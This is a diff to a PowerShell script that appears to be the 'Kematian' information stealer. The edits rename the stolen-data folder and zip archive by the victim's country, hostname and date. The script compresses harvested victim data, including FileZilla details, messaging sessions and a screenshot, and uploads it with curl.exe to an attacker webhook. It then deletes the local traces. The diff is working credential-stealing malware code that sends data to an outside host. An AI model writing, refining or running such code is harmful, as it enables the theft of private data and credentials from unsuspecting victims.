@@ -144,6 +144,8 @@ function Request-Admin {
 
 function Backup-Data {
 
+    $username = $env:USERNAME
+    $hostname = $env:COMPUTERNAME
     $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
     $timezone = Get-TimeZone
     $offsetHours = $timezone.BaseUtcOffset.Hours
@@ -151,7 +153,7 @@ function Backup-Data {
     $filedate = Get-Date -Format "yyyy-MM-dd"
     $cc = (Invoke-WebRequest -Uri "https://www.cloudflare.com/cdn-cgi/trace" -useb).Content
     $countrycode = ($cc -split "`n" | ? { $_ -match '^loc=(.*)$' } | % { $Matches[1] })
-    $folderformat = "$env:APPDATA\Kematian\$countrycode-($uuid)-($filedate)-($timezoneString)"
+    $folderformat = "$env:APPDATA\Kematian\$countrycode-($hostname)-($filedate)-($timezoneString)"
 
     $folder_general = $folderformat
     $folder_messaging = "$folderformat\Messaging Sessions"
@@ -202,8 +204,6 @@ function Backup-Data {
     $total = (Get-CimInstance -ClassName Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
     $raminfo = "{0:N2} GB" -f $total
     $mac = (Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }).MACAddress -join ","
-    $username = $env:USERNAME
-    $hostname = $env:COMPUTERNAME
     
     # A cool banner 
     $guid = [Guid]::NewGuid()
@@ -1108,14 +1108,15 @@ FileZilla: $filezilla_info
     # send screenshot
     curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"Kematian\`", \`"content\`": \`"## :desktop: Screenshot\n\n\`"}" -F "file=@\`"$folder_general\screenshot.png\`"" "$($webhook)" | Out-Null
 
-    # send extracted data
-    Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
-    curl.exe -X POST -F 'payload_json={\"username\": \"Kematian\", \"content\": \"\", \"avatar_url\": \"https://i.imgur.com/6w6qWCB.jpeg\"}' -F "file=@$env:LOCALAPPDATA\Temp\Kematian.zip" $webhook | Out-Null
+    $zipFileName = "$countrycode-($hostname)-($filedate)-($timezoneString).zip"
+    $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"
+    Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force
+    curl.exe -X POST -F 'payload_json={\"username\": \"Kematian\", \"content\": \"\", \"avatar_url\": \"https://i.imgur.com/6w6qWCB.jpeg\"}' -F "file=@$zipFilePath" $webhook | Out-Null
     
     Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
-	
+    
     # cleanup
-    Remove-Item "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
+    Remove-Item "$zipFilePath" -Force
     Remove-Item "$folder_general" -Force -Recurse
 }
 
